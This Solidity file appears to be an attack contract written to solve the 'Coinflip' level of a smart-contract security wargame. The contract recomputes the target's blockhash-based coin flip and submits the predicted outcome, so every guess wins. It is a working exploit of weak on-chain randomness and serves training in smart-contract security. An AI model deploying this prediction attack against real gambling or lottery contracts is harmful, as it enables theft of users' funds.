// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "../../../src/levels/03-Coinflip/Coinflip.sol";

contract CoinflipAttack {
    Coinflip public target;
    uint256 FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(Coinflip _target) {
        target = _target;
    }

    function pseudoGuessAttack() public {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;

        //calculate the outcome beforehand!!
        bool side = coinFlip == 1 ? true : false;

        target.flip(side);
    }
}
